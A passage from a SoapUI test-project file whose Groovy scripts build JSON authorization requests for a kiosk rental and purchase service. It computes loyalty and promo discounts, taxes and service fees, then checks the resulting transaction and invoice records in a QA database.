		    	//log.info ("curLoyaltyFlag:$curLoyaltyFlag; curLoyaltyTitle:$curLoyaltyTitle; curLoyaltyPrice:$curLoyaltyPrice; curredemptionPoints:$curredemptionPoints");
		    	if (curLoyaltyFlag == '1')
		    	{
		    	testRunner.testCase.setPropertyValue("HasLoyaltyDiscount","1");
		    	loyaltyPayload += "{"; 
			loyaltyPayload += "\"ProductId\": $curLoyaltyTitle,";
			loyaltyPayload += "\"DiscountType\": \"Loyalty\",";
			loyaltyPayload += "\"PromotionCode\": null,";
			loyaltyPayload += "\"RedemptionPoints\": $curredemptionPoints,";
			loyaltyPayload += "\"Amount\": $curLoyaltyPrice";
			loyaltyPayload += "}"; 
			//Calculate Loyalty Total
			EstimatedLoyaltyAmount += (curLoyaltyPrice.toBigDecimal());
			loyaltyProductId.add(curLoyaltyTitle);
		    	loyaltyProductPrice.add(curLoyaltyPrice);
		    	loyaltyPoints.add(curredemptionPoints);
		    	discountAmountList.add(curLoyaltyPrice); //PROMO
		    	//For Assertions grabbing all the Discounted Titles and Prices.
		    	discountedProductId.add(curLoyaltyTitle);
		    	discountedProductPrice.add(curLoyaltyPrice);
		    	}
		    	else if (curLoyaltyFlag == "0")
		    	{
		    		//testRunner.testCase.setPropertyValue("HasLoyaltyDiscount","0");
		    		nonLoyaltyProductId.add(curLoyaltyTitle);
		    		nonLoyaltyProductPrice.add(curLoyaltyPrice);
		    	}
		    	testRunner.testCase.setPropertyValue("DiscountTitleIds",DiscountTitleIds.drop(1).toString().replace("[", "").replace("]", ""))
		    	testRunner.testCase.setPropertyValue("DiscountProductPrices",DiscountProductPrices.drop(1).toString().replace("[", "").replace("]", ""));
		    	testRunner.testCase.setPropertyValue("RedemptionPoints",redemptionPointsList.drop(1).toString().replace("[", "").replace("]", ""))		    	
		    	if (l+1 < numberOfLoyaltyFlags)
		      {
		      		if (curLoyaltyFlag == '1')
		      		{
		      			loyaltyPayload += ","
		      		}
		      		else
		      		{
		      			//None as of Now		      			
		      		}		      		     	
		      }
		      //log.info ("loyaltyPayload: $loyaltyPayload");
		} 
		testRunner.testCase.setPropertyValue("LoyaltyProductPrice",loyaltyProductPrice.join(",").toString());
		testRunner.testCase.setPropertyValue("LoyaltyProductId",loyaltyProductId.join(",").toString());
		testRunner.testCase.setPropertyValue("NonLoyaltyProductId",nonLoyaltyProductId.join(",").toString());
		testRunner.testCase.setPropertyValue("NonLoyaltyProductPrice",nonLoyaltyProductPrice.join(",").toString());
	}
	//Build Promo Payload
	if ((PromoCode == "" || PromoCode == "null" || PromoCode == null))
	{
		testRunner.testCase.setPropertyValue("HasPromoDiscount","0");//NO Promo
	}
	//TSP
	else if (numberOfTSPFlags > 0)
	{
		testRunner.testCase.setPropertyValue("HasPromoDiscount","1");
		def getNonLoyaltyProductId = context.expand( '${#TestCase#DiscountTitleIds}' );
		def getNonLoyaltyProductPrice = context.expand( '${#TestCase#DiscountProductPrices}' );
		//log.info ("getNonLoyaltyProductId:$getNonLoyaltyProductId; getNonLoyaltyProductPrice:$getNonLoyaltyProductPrice");
		getNonLoyaltyProductIdList = getNonLoyaltyProductId.split(",");
		getNonLoyaltyProductPriceList = getNonLoyaltyProductPrice.split(",");
		tspFlagList = tspFlag.split(","); //TSP
		for (tsp = 0; tsp < numberOfTSPFlags; tsp++)
		{
			curPromoTitleID = getNonLoyaltyProductIdList[tsp].toString().trim();
			curPromoTitlePrice = getNonLoyaltyProductPriceList[tsp].toString().trim();
			curTspFlag = tspFlagList[tsp].toString().trim(); //TSP
			promoPayload += "{";
			promoPayload += "\"ProductId\": $curPromoTitleID,";
			promoPayload += "\"DiscountType\": \"PromotionCode\",";
			promoPayload += "\"PromotionCode\": \"$PromoCode\",";			
            	promoPayload += "\"PromotionIntentCode\": 4,";
			promoPayload += "\"PromotionCodeValue\": \"$discountvalue\",";
			promoPayload += "\"Amount\": $discountvalue";
			promoPayload += "}";	

			tspPromoAmount += (discountvalue.toBigDecimal());
			discountedProductId.add(curPromoTitleID);
			discountedProductPrice.add(discountvalue);
			if (tsp+1 < numberOfTSPFlags)
			  {
					if (curTspFlag == '1')
					{
						promoPayload += ","
					}
					else
					{
						//None as of Now						
					}
			  }
		}
	}
	else
	{
		testRunner.testCase.setPropertyValue("HasPromoDiscount","1");
		def getNonLoyaltyProductId = context.expand( '${#TestCase#DiscountTitleIds}' );
		def getNonLoyaltyProductPrice = context.expand( '${#TestCase#DiscountProductPrices}' );
		//log.info ("getNonLoyaltyProductId:$getNonLoyaltyProductId; getNonLoyaltyProductPrice:$getNonLoyaltyProductPrice");
		getNonLoyaltyProductIdList = getNonLoyaltyProductId.split(",");
		getNonLoyaltyProductPriceList = getNonLoyaltyProductPrice.split(",");
		
		promoCodeValue = Round16.format(discountvalue).toBigDecimal();
		//Set Remaining Promo value same as Promo Value
		testRunner.testCase.setPropertyValue("RemainingPromoValue",promoCodeValue.toString());

		//For Loop to build Promo Payload
		for (d = 0; d < getNonLoyaltyProductIdList.size(); d++)
		{
			//Get Remaining promo value
			remainingPromoValue = context.expand( '${#TestCase#RemainingPromoValue}' ).toBigDecimal();
			if (remainingPromoValue > 0)
			{
				curPromoTitleID = getNonLoyaltyProductIdList[d].toString().trim();
				curPromoTitlePrice = getNonLoyaltyProductPriceList[d].toString().trim();
				BigDecimal curPromoAmount = 0; //For assertions.
				promoPayload += "{";
				promoPayload += "\"ProductId\": $curPromoTitleID,";
				promoPayload += "\"DiscountType\": \"PromotionCode\",";
				promoPayload += "\"PromotionCode\": \"$PromoCode\",";
				promoPayload += "\"PromotionCodeValue\": \"$discountvalue\",";
				promoPayload += "\"PromotionIntentCode\": 7,";
		
				BigDecimal currentPromoValue = remainingPromoValue - (curPromoTitlePrice.toBigDecimal());
		
				if (remainingPromoValue >= curPromoTitlePrice.toBigDecimal())
				{
					promoPayload += "\"Amount\": $curPromoTitlePrice";
					appliedPromoValue += (curPromoTitlePrice.toBigDecimal());
					curPromoAmount = curPromoTitlePrice.toBigDecimal();
					discountAmountList.add(curPromoAmount); //PROMO
					remaingPromoValue = (remainingPromoValue.toBigDecimal() -  curPromoTitlePrice.toBigDecimal());
					//Set Remaining Promo value after above calculation
					testRunner.testCase.setPropertyValue("RemainingPromoValue",remaingPromoValue.toString());	
				}
				else if (remainingPromoValue < curPromoTitlePrice.toBigDecimal())
				{
					promoPayload += "\"Amount\": $remainingPromoValue";
					appliedPromoValue += (remainingPromoValue.toBigDecimal())
					curPromoAmount = remainingPromoValue.toBigDecimal();
					discountAmountList.add(curPromoAmount); //PROMO
					//Set Remaining Promo value as 0.00
					testRunner.testCase.setPropertyValue("RemainingPromoValue","0.00");
				}
				else
				{
					log.info ("No PromoValue Remaining");
				}				
				promoPayload += "}";				
			    	//For Assertions grabbing all the Discounted Titles and Prices.
			    	discountedProductId.add(curPromoTitleID);
			    	discountedProductPrice.add(curPromoAmount);	
			}
			//Get Remaining promo value
			remainingPromoValue = context.expand( '${#TestCase#RemainingPromoValue}' ).toBigDecimal();
			//Continue to for loop if number of titles available and have Remaining promo value > 0
			if ((d+1 < getNonLoyaltyProductIdList.size()) && remainingPromoValue > 0)
			        {
			            promoPayload += ",";
			        } 
		}
		//log.info ("PromoPayload: $promoPayload");
	}
	testRunner.testCase.setPropertyValue("AppliedPromoValue",appliedPromoValue.toString());
	testRunner.testCase.setPropertyValue("DiscountAmountList",discountAmountList.join(",").toString()); //PROMO
	//log.info ("promoPayload:$promoPayload");
	testRunner.testCase.setPropertyValue("EstimatedLoyaltyAmount", EstimatedLoyaltyAmount.toString());
	//Rounding the rental Total
	rentalTotal = Round16.format(rentalTotal).toBigDecimal();
	SubTotal += rentalTotal;
	log.info ("EstimatedLoyaltyAmount:$EstimatedLoyaltyAmount; discountvalue:$discountvalue");
	discountvalue = Round16.format(discountvalue).toBigDecimal();
	log.info ("Rentals Total: $rentalTotal; Promo Amount: $discountvalue");
	BigDecimal discountedSubTotal
	discountedSubTotal = ((rentalTotal).toBigDecimal()) - ((EstimatedLoyaltyAmount).toBigDecimal());
	//log.info ("discountedSubTotal:$discountedSubTotal");
	//TSP
	if (numberOfTSPFlags > 0) 
	{
		discountvalue = tspPromoAmount; //Promo Amount is set as TSP Amount.
		testRunner.testCase.setPropertyValue("PromoValue", tspPromoAmount.toString())
	}
	if (discountedSubTotal <= discountvalue)	{ discountedSubTotal = 0 }
	//else { discountedSubTotal = ((rentalTotal).toBigDecimal()) - ((discountvalue).toBigDecimal()) }
	else { discountedSubTotal = ((discountedSubTotal).toBigDecimal()) - ((discountvalue).toBigDecimal()) }
	
	// Rounding Discounted SubTotal 
	discountedSubTotal = Round16.format(discountedSubTotal).toBigDecimal();
	BigDecimal renttaxRate = ((context.expand( '${#TestCase#RentalTaxRate}').toBigDecimal()) / 100)
	BigDecimal rentalTaxAmt = (Round16.format(discountedSubTotal).toBigDecimal()) * ((renttaxRate).toBigDecimal());
	rentalTaxAmt = Round16.format(rentalTaxAmt).toBigDecimal();
	DiscountedSubTotal += discountedSubTotal;
	TotalCartAmount += discountedSubTotal; //To get total amount
	BigDecimal grandTotal = discountedSubTotal + rentalTaxAmt;
	// trying to solve some rounding issues
	grandTotal = Round16.format(grandTotal).toBigDecimal();
	log.info ("Rentals Discounted Total:$discountedSubTotal; Rentals Tax Amount:$rentalTaxAmt; Rentals Grand Total:$grandTotal");
	// add totals to the strings
	rentalPayload += "]," 
	rentalPayload += "\"Totals\" : { "
	rentalPayload += "\"TaxRate\" : " + context.expand( '${#TestCase#RentalTaxRate}') + ","
	rentalPayload += "\"Subtotal\" : $rentalTotal ,"
	rentalPayload += "\"DiscountedSubtotal\" : $discountedSubTotal,"
	rentalPayload += "\"TaxAmount\" : $rentalTaxAmt,"
	rentalPayload += "\"GrandTotal\" : $grandTotal} }";
	
	testRunner.testCase.setPropertyValue("rentalPayload",rentalPayload);
	testRunner.testCase.setPropertyValue("RentalTaxAmount", rentalTaxAmt.toString());
	rentalTotal = grandTotal; //Defining it to calculate Total Amount
}
log.info ("discountedProductId:$discountedProductId; discountedProductPrice:$discountedProductPrice");
//Purchase payload
if ((purchaseFormatIds == '0') || (purchaseFormatIds == '') || (rentalFormatIds == 'null'))
{
	log.info ("No Purchases in the transaction");
	testRunner.testCase.setPropertyValue('PurchaseCount', purchaseCount.toString());
	testRunner.testCase.setPropertyValue("PurchaseTaxAmount", '0');
}
else
{
	for (r = 0; r < purchaseformatIDList.size(); r++)
	{
	    curPurchaseFormatID = purchaseformatIDList[r].toString().trim();
	    curmdvFlag = mdvFlagList[r].toString().trim();
	    //log.info ("PurchaseFormatID: $curPurchaseFormatID");
	    def getFormatName = sql.firstRow("select FormatName AS OID from Format where FormatID = $curPurchaseFormatID");
	    def purchaseFormatName = (getFormatName.OID);
	    getDisctc.setPropertyValue('FormatID', curPurchaseFormatID);
	    getDisctc.setPropertyValue('FormatName', purchaseFormatName);  
	    getDisctc.setPropertyValue('KioskID',KioskId);
	    getDisctc.setPropertyValue('IsMDV',curmdvFlag);  //MDV  	    
	    //Run the test case: GetRecoDiscs
	    def runGetDiscs = getDisctc.run( null, false );
	        
	    // show that it worked out ok
	    log.info("Status: $runGetDiscs.status, time taken for TestCase : [Get Discs] For $purchaseFormatName was: $runGetDiscs.timeTaken ms");
	        
	    // assert that it didn't fail
	    assert runGetDiscs.status != Status.FAILED : runGetDiscs.reason
	}
	
	//Offer Code	
	offerCodeList = remainingRCFlag.toString().replaceAll("\\[","").replaceAll("\\]","").split(",");
	
	for (f = 0; f < purchaseformatIDList.size(); f++)
	{
	    curformatID = purchaseformatIDList[f].toString().trim();
	    def getFormatName = sql.firstRow("select FormatName, FormatTypeID from Format where FormatID = $curformatID");
	    def FormatName = (getFormatName.FormatName);
	    def formatTypeID = (getFormatName.FormatTypeID.toString());
	    
	    //Get FormatTypeName from FormatIypeID
	    def excuteFormatType = sql.firstRow("Select FormatTypeName from FormatType Where FormatTypeID = $formatTypeID");
	    def formatTypeName = (excuteFormatType.FormatTypeName.toString());
	    
	    def getBarcode = getDisctc.getPropertyValue("$FormatName-Barcodes");
	    def getTitleIDs = getDisctc.getPropertyValue("$FormatName-Titles");    
	    //log.info ("getBarcode-$FormatName: $getBarcode");
	    getBarcodeList = getBarcode.split(",")
	    getTitleList = getTitleIDs.split(",")
	
	    numOfPurchaseBarcodes = numAddPurchasesList[f].toString().trim()
	    log.info ("numOfPurchaseBarcodes: $numOfPurchaseBarcodes; FormatName: $FormatName");
	
	    for (b = 0; b < numOfPurchaseBarcodes.toInteger(); b++)
	    {
		curBarcodeID = getBarcodeList[b].toString().trim();
		curTitleID = getTitleList[b].toString().trim();
		curOfferCode = offerCodeList[b].toString().trim();
		purchasePayload += "{"
		purchasePayload += "\"ProductId\" : $curTitleID,"
		purchasePayload += "\"Barcode\" : \"$curBarcodeID\","
		purchasePayload += "\"VendStatus\" : 28," //To-DO
		purchasePayload += "\"ProductFamily\" : \"$formatTypeName\","
		purchasePayload += "\"ProductType\" : \"$FormatName\","
		//MDV
		purchasePayload += "\"MultiDisc\" : false,"
		purchasePayload += "\"DiscNumber\" : null,"
		
		if (curOfferCode == '1')
		{
			purchasePayload += "\"OfferCode\" : \"RC\","
		}
		else
		{
			purchasePayload += "\"OfferCode\" : null,"
		}
		purchasePayload += "\"Pricing\" : {"
	        if (curformatID == '17') //DigitalCode Json
	        {
	            purchasePayload += "\"InitialNight\" : 0,"
	            purchasePayload += "\"ExtraNight\" : 0,"
	            purchasePayload += "\"NonReturn\" : 0,"
	            purchasePayload += "\"Purchase\" : $digitalCodePrice,"
	            purchasePayload += "\"Expiration\" : 0,"
	            purchasePayload += "\"NonReturnDays\" : 0,"
	            //Added a part of ProductPricing for BI; harcoded for the time being.
	            purchasePayload += "\"PriceSetId\" : 0,"
	            purchasePayload += "\"ProductPriceId\" : 0,"
	            purchasePayload += "\"InitialDays\" : null,"
	            purchasePayload += "\"DefaultInitialNight\" : null,"
	            purchasePayload += "\"DefaultExtraNight\" : null"
		  
	            //Calculate Rental Total
	            digitalTotal += (digitalCodePrice.toBigDecimal());
	            purchaseDiscPrice.add(digitalCodePrice);
	        }
	        else  //Regular Purchase of DVD, Bluray, or Game
	        {
	            purchasePayload += "\"InitialNight\" : 0,"
	            purchasePayload += "\"ExtraNight\" : 0,"
	            purchasePayload += "\"NonReturn\" : 0,"
	            purchasePayload += "\"Purchase\" : $purchasePrice,"
	            purchasePayload += "\"Expiration\" : 0,"
	            purchasePayload += "\"NonReturnDays\" : 0,"
	            //Added a part of ProductPricing for BI; harcoded for the time being.
	            purchasePayload += "\"PriceSetId\" : 0,"
	            purchasePayload += "\"ProductPriceId\" : 0,"
	            purchasePayload += "\"InitialDays\" : null,"
	            purchasePayload += "\"DefaultInitialNight\" : null,"
	            purchasePayload += "\"DefaultExtraNight\" : null"
	
	            //Calculate Rental Total
	            purchaseTotal += (purchasePrice.toBigDecimal());
	            purchaseDiscPrice.add(purchasePrice);
	            HasPhysicalPurchase = 'true';
	            testRunner.testCase.setPropertyValue("HasPhysicalPurchase",HasPhysicalPurchase);
	        }
		purchasePayload += "}"    
		purchasePayload += "}" 
		//Combine the list
		purchaseTitleIds.add(curTitleID);
		purchaseBarcodes.add(curBarcodeID);
		allBarcodes.add(curBarcodeID);
		purchaseProductFamily.add(formatTypeName);
		purchaseProductType.add(FormatName);
		testRunner.testCase.setPropertyValue("BarcodeForTnx",curBarcodeID.toString());
		//MDV
		purchaseMDVFlag.add('false');
		purchaseMDVDiscNumber.add('null');
	        //Count num of purchase.
	        purchaseCount += 1;
	        if (b+1 < numOfPurchaseBarcodes.toInteger())
	        {
	            purchasePayload += ","
	        } 
	    }
	    if (f+1 < purchaseformatIDList.size())
	    {
	        purchasePayload += ","
	    }
	    getDisctc.setPropertyValue('ExcludeRentalTitles', purchaseTitleIds.join(",").toString());
	    testRunner.testCase.setPropertyValue('PurchaseTitleIds', purchaseTitleIds.join(",").toString());
	    testRunner.testCase.setPropertyValue('PurchaseBarcodes', purchaseBarcodes.join(",").toString());
	    testRunner.testCase.setPropertyValue('PurchaseProductFamily', purchaseProductFamily.join(",").toString());
	    testRunner.testCase.setPropertyValue('PurchaseProductType', purchaseProductType.join(",").toString());
	    testRunner.testCase.setPropertyValue('PurchaseCount', purchaseCount.toString());
	    testRunner.testCase.setPropertyValue('PurchaseDiscPrice', purchaseDiscPrice.join(",").toString());
	    //MDV
	    testRunner.testCase.setPropertyValue('PurchaseMDVFlag', purchaseMDVFlag.join(",").toString());
	    testRunner.testCase.setPropertyValue('PurchaseMDVDiscNumber', purchaseMDVDiscNumber.join(",").toString());
	}
	
	//Purchase Calculation	
	BigDecimal totalPurchaseTotal = (purchaseTotal.toBigDecimal() + digitalTotal.toBigDecimal())
	//log.info ("totalPurchaseTotal: $totalPurchaseTotal");
	DiscountedSubTotal += totalPurchaseTotal;
	SubTotal += totalPurchaseTotal;
	def purchasetaxRate = context.expand( '${#TestCase#PurchaseTaxRate}');
	def digitalpurchasetaxRate = context.expand( '${#TestCase#DigitalPurchaseTaxRate}');
	if (digitalpurchasetaxRate == null || digitalpurchasetaxRate == "null" || digitalpurchasetaxRate == "") //If digitalpurchasetaxrate is null than use Purchase tax rate.
	{
		BigDecimal digitaltaxRate = ((purchasetaxRate.toBigDecimal()) / 100);
		BigDecimal digitalpurchaseTaxAmt = (Round16.format(digitalTotal).toBigDecimal()) * ((digitaltaxRate).toBigDecimal());
		digitalpurchaseTaxAmt = Round16.format(digitalpurchaseTaxAmt).toBigDecimal();
		testRunner.testCase.setPropertyValue("digitalpurchaseTaxAmt", digitalpurchaseTaxAmt.toString());
	}
	else //if digitalpurchasetaxrate is not null than use that ever is provided.
	{
		BigDecimal digitaltaxRate = ((digitalpurchasetaxRate.toBigDecimal()) / 100);
		BigDecimal digitalpurchaseTaxAmt = (Round16.format(digitalTotal).toBigDecimal()) * ((digitaltaxRate).toBigDecimal());
		digitalpurchaseTaxAmt = Round16.format(digitalpurchaseTaxAmt).toBigDecimal();
		testRunner.testCase.setPropertyValue("digitalpurchaseTaxAmt", digitalpurchaseTaxAmt.toString());
	}
	def totaldigitalpurchasetaxAmount = context.expand( '${#TestCase#digitalpurchaseTaxAmt}');
		
	BigDecimal purchaseTaxAmt = (Round16.format(purchaseTotal).toBigDecimal()) * ((purchasetaxRate).toBigDecimal()/100);
	purchaseTaxAmt = Round16.format(purchaseTaxAmt).toBigDecimal();
	
	log.info ("Digital Purchase Tax Amount: $totaldigitalpurchasetaxAmount; Purchase Tax Amount: $purchaseTaxAmt");
	def totalTaxAmount = (totaldigitalpurchasetaxAmount.toBigDecimal() + purchaseTaxAmt.toBigDecimal());
	BigDecimal purchaseGrandTotal = (totalPurchaseTotal + totalTaxAmount).toBigDecimal();
	log.info("Purchase Grand Total: $purchaseGrandTotal; Total Tax Amount: $totalTaxAmount");
	TotalCartAmount += totalPurchaseTotal; //To get total amount
	// add totals to the strings
	purchasePayload += "],"
	purchasePayload += "\"Totals\" : { ";
	if (HasPhysicalPurchase == 'true')
	{
		purchasePayload += "\"TaxRate\" : " + context.expand('${#TestCase#purchasetaxrate}') + ", ";
	}
	else
	{
		purchasePayload += "\"TaxRate\" : " + context.expand('${#TestCase#DigitalPurchaseTaxRate}') + ", ";
	}
	purchasePayload += "\"Subtotal\" : $totalPurchaseTotal,";
	purchasePayload += "\"DiscountedSubtotal\" : $totalPurchaseTotal,";
	//purchasePayload += "\"TaxAmount\" : \"" + totalTaxAmount + "\",";
	purchasePayload += "\"TaxAmount\" : $totalTaxAmount,";
	purchasePayload += "\"GrandTotal\" : $purchaseGrandTotal } }";
	
	testRunner.testCase.setPropertyValue("purchasePayload",purchasePayload);
	testRunner.testCase.setPropertyValue("PurchaseTaxAmount", totalTaxAmount.toString());
	purchaseTotal = purchaseGrandTotal;//Defining it to calculate Total Amount
}
testRunner.testCase.setPropertyValue('AllBarcodes', allBarcodes.join(",").toString());
TransactionTotal = (rentalTotal + purchaseTotal).setScale(2, BigDecimal.ROUND_HALF_UP);
//log.info ("TransactionTotal: $TransactionTotal");
testRunner.testCase.setPropertyValue("TransactionTotal",TransactionTotal.toString());
testRunner.testCase.setPropertyValue("DiscountedSubTotal",DiscountedSubTotal.toString());
testRunner.testCase.setPropertyValue("SubTotal",SubTotal.toString());

def HasLoyaltyDiscount = context.expand( '${#TestCase#HasLoyaltyDiscount}');
def HasPromoDiscount = context.expand( '${#TestCase#HasPromoDiscount}');
def discountPayload = "";

if (HasLoyaltyDiscount == '1' && HasPromoDiscount == '0')
{
	discountPayload = loyaltyPayload;
	log.info ("Has Loyalty Only");
}
else if (HasLoyaltyDiscount == '0' && HasPromoDiscount == '1')
{
	discountPayload = promoPayload;
	log.info ("Has Promo Only");
}
else if (HasLoyaltyDiscount == '1' && HasPromoDiscount == '1')
{
	discountPayload = "$loyaltyPayload,$promoPayload";
	log.info ("Has Loyalty and Promo");
}
else
{
	discountPayload = ""
	log.info ("No Promo and Loyalty");
}
log.info ("discountPayload:$discountPayload");
testRunner.testCase.setPropertyValue("DiscountPayload", discountPayload);
if (enableServiceFee == 'true')
{		
	serviceFeePayload += ",\"ServiceFee\": {";
	serviceFeePayload += "\"DefaultAmount\": \"$serviceFeeAmount\",";
	serviceFeePayload += "\"TaxRate\": $serviceFeeTaxRate,";
	if (TotalCartAmount > 0)
	{
		serviceFeePayload += "\"ActualAmount\": \"$serviceFeeAmount\",";
		BigDecimal serviceFeeTaxAmt = ((serviceFeeAmount).toBigDecimal()) * ((serviceFeeTaxRate).toBigDecimal()/100);
		serviceFeeTaxAmt = Round16.format(serviceFeeTaxAmt).toBigDecimal();
		serviceFeePayload += "\"TaxAmount\": \"$serviceFeeTaxAmt\" }";
	}
	else
	{
		serviceFeePayload += "\"ActualAmount\": \"0.00\",";
		serviceFeePayload += "\"TaxAmount\": \"0.00\" }";
	}
}
else
{
	log.info ("NO ServiceFee enabled");
}
testRunner.testCase.setPropertyValue("ServiceFeePayload",serviceFeePayload);

//Get Info needed 
def MessageId = UUID.randomUUID().toString();

def UseCredits = context.expand( '${#TestCase#UseCredits}');
calendar = Calendar.getInstance();
def theDate = (621355968000000000 +calendar.getTimeInMillis()*10000).toString();
def dateString = (new Date().format("yyyy-MM-dd'T'HH:mm:ss.SSSSSSS"));

//Build Authorize Request
requestPayload += "{";
requestPayload += "\"MessageType\": \"Authorize\",";
requestPayload += "\"MessageId\": \"$MessageId\",";
requestPayload += "\"EngineVersion\": \"1.27.1.297\",";
requestPayload += "\"BundleVersion\": \"2.27.1.65\",";
requestPayload += "\"KioskId\": $KioskId,";
if ((CustomerProfileNumber == "") || (CustomerProfileNumber == "<CPCUSTOMERNUMBER/>"))
{
	//No CP for the credit card
	requestPayload += "\"CustomerProfileNumber\": null,";
	requestPayload += "\"PropertyBag\": { },";
}
else
{
	requestPayload += "\"CustomerProfileNumber\": \"$CustomerProfileNumber\",";
	requestPayload += "\"PropertyBag\": { \"EarlyIdIndicator\":\"true\" },"
}
requestPayload += "$ccPayload";
requestPayload += "\"TransactionDate\": {";
requestPayload += "\"theDate\": $theDate,";
requestPayload += "\"dateTimeKind\": \"Unspecified\",";
requestPayload += "\"dateString\": \"$dateString\"";
requestPayload += "},";
requestPayload += "\"UseCredits\": \"OptedOut\",";
//requestPayload += "\"UseCredits\": \"OptedIn\",";
requestPayload += "\"ShoppingCart\": { ";
requestPayload += "\"Groups\": [  ";
if (rentalCount > 0 && purchaseCount == 0) {
	requestPayload += "$rentalPayload";
} else if (rentalCount == 0 && purchaseCount > 0) {
	requestPayload += "$purchasePayload";
} else if (rentalCount > 0 && purchaseCount > 0) {
	requestPayload += "$rentalPayload,$purchasePayload";
} else {
	log.info("No rental or purchase information generated!");
}
requestPayload += "],";
requestPayload += "\"Discounts\": [$discountPayload]";
requestPayload += "$serviceFeePayload";
requestPayload += "}} ";

// log to soapui log
log.info("Authorize Request: $requestPayload");

// url encode json string
result = "payload=" + URLEncoder.encode(requestPayload)
testRunner.testCase.setPropertyValue("RequestBody",result);
def IsOffline = context.expand( '${#TestCase#IsOffline}');
if (IsOffline == 'true')
{
	log.info ("No Authorize, skip to Reconcile");
	testRunner.gotoStepByName("Auth Completed");
}
else
{
	//Run Auth
}]]></script></con:config></con:testStep><con:testStep type="httprequest" name="Authorize (Request)" id="f3da66c5-32ae-4d05-8f02-ef023e9fb422"><con:settings/><con:config method="POST" xsi:type="con:HttpRequest" name="Authorize (Request)" postQueryString="false" mediaType="application/x-www-form-urlencoded" id="b2fa5210-dde2-4787-8c9d-57bcd781cdfc" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:settings><con:setting id="com.eviware.soapui.impl.wsdl.WsdlRequest@request-headers">&lt;xml-fragment/></con:setting></con:settings><con:endpoint>${#Project#KSEndpoint}</con:endpoint><con:request>${#TestCase#RequestBody}</con:request><con:assertion type="GroovyScriptAssertion" name="Check for Success and HasErrors" id="70bc7102-0d46-4704-81fc-09b7237cee25"><con:configuration><scriptText>def response = URLDecoder.decode(messageExchange.getResponseContent())
log.info ("Authorize Response: $response")
assert response.contains("\"Success\":true,")
assert response.contains("\"HasErrors\":false,")

</scriptText></con:configuration></con:assertion><con:credentials><con:selectedAuthProfile>Basic</con:selectedAuthProfile><con:addedBasicAuthenticationTypes>Basic</con:addedBasicAuthenticationTypes><con:authType>No Authorization</con:authType></con:credentials><con:jmsConfig JMSDeliveryMode="PERSISTENT"/><con:jmsPropertyConfig/><con:parameters/><con:environmentSpec><con:entry environmentId="088f2c6b-5bf5-4b7a-aea1-4ebec9f3aa3a"><con:authProfile>Basic</con:authProfile></con:entry><con:entry environmentId="bff3f14b-e680-473b-bba1-89a50bc86a72"><con:authProfile>Basic</con:authProfile></con:entry></con:environmentSpec></con:config></con:testStep><con:testStep type="groovy" name="Save Authorize Response" id="bb3dd6f2-50d9-454e-be6d-7f103d5ad209"><con:settings/><con:config><script>import groovy.json.JsonSlurper
def encodedBody = testRunner.testCase.getTestStepByName('Authorize (Request)').getPropertyValue('Response');
//log.info(encodedBody);
def decodedBody = URLDecoder.decode(encodedBody);
//log.info("AuthResponse:$decodedBody");
def list = new JsonSlurper().parseText( decodedBody );
def TransactionID = list.get('ReferenceNumber');
log.info('Transaction_ID = ' + list.get('ReferenceNumber'))
testRunner.testCase.setPropertyValue("TransactionID",list.get('ReferenceNumber').toString());

//Define the Db Connection
import groovy.sql.*;
// Below line will create an object of the already created JDBC connection.
def ConObj = context.testCase.testSuite.project.databaseConnectionContainer.getResourceByName('MerchantService');
def constring = ConObj.getConnectionString();
//Define the Connection
def sql = Sql.newInstance(constring);

def getInvoiceDetails = sql.firstRow("Select max(OID) AS ID from Invoice Where ReferenceNumber = '$TransactionID'");
def InvoiceId = getInvoiceDetails.ID;
testRunner.testCase.setPropertyValue("InvoiceID",InvoiceId.toString());</script></con:config></con:testStep><con:testStep type="jdbc" name="Check Transaction" id="1d9ecf26-9acc-475e-b2a9-b809ffb877e4"><con:settings><con:setting id="prettyPrintResponse">true</con:setting></con:settings><con:config xsi:type="con:JdbcRequestTestStep" convertColumnNamesToUpperCase="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:dbConnectionName>RedboxServerDB</con:dbConnectionName><con:driver>com.microsoft.sqlserver.jdbc.SQLServerDriver</con:driver><con:connectionString>jdbc:sqlserver://QADB100.rb.local:1433;databaseName=RedboxServerDB;integratedSecurity=true;</con:connectionString><con:password>t</con:password><con:connectionProperties/><con:query>SELECT 
	transaction_id,
	kioskclient_id,
	promotioncode,
	promotionvalue,
	transaction_status,
	rent_date,
	approvalcode,
	invoiceid,
	amount,
	isoffline,
	rentaltype,
	authamount,
	subtotal,
	discountedsubtotal,
	salestaxamount,
	grandtotal,
	billingtypeid,
	rentaltaxrate,
	purchasetaxrate,
	rentaltaxamount,
	purchasetaxamount,
	shoppingcarttype,
	optintypeID,
	cpCustomerNumber,
	ServiceFee,
	ServiceFeeTaxAmount
FROM
	[Transaction](nolock)
WHERE 
	transaction_id = :TnxId
</con:query><con:storedProcedure>false</con:storedProcedure><con:assertion type="Simple Contains" name="Contains ApprovalCode" id="b6c88e9c-d6aa-482f-a3cf-28de7d50e88c"><con:configuration><token>Approved</token><ignoreCase>false</ignoreCase><useRegEx>false</useRegEx></con:configuration></con:assertion><con:assertion type="GroovyScriptAssertion" name="Check BillingType" id="3d102727-0107-496f-9f31-2aec87ad4ec2" disabled="true"><con:configuration><scriptText>//import groovy.json.JsonSlurper

def groovyUtils = new com.eviware.soapui.support.GroovyUtils( context )
def holder = groovyUtils.getXmlHolder( "Check Transaction#ResponseAsXml");
def actualBillingTypeID = holder.getNodeValue("//BILLINGTYPEID[1]")
assert actualBillingTypeID == null
/*
def numrentals = context.expand( '${#TestCase#RentalCount}' ).toInteger();
def numpurchases = context.expand( '${#TestCase#PurchaseCount}' ).toInteger();

 DISABLED THE ASSERTION BASED ON COLLECTION METHOD
//Added if and else logic for PRM and PRG functionality.
if (numrentals > 0 &amp;&amp; numpurchases > 0)
{
	assert actualBillingTypeID == 6; //Because of PRM and PRG functionality.
}
else
{
	assert actualBillingTypeID == 7;
}


else
{
	// if collection method is 1 or 2, billing type 6, collection method 4 or 6 = billing type 7
	if (context.expand( '${#TestSuite#collectionmethod}' ).toInteger() == 1)
		assert actualValue == 6
	else if (context.expand( '${#TestSuite#collectionmethod}' ).toInteger() == 2)
		assert actualValue == 6
	else if (context.expand( '${#TestSuite#collectionmethod}' ).toInteger() == 4)
		assert actualValue == 7
	else if (context.expand( '${#TestSuite#collectionmethod}' ).toInteger() == 6)
		assert actualValue == 7
	else
		assert 0 == 1
}
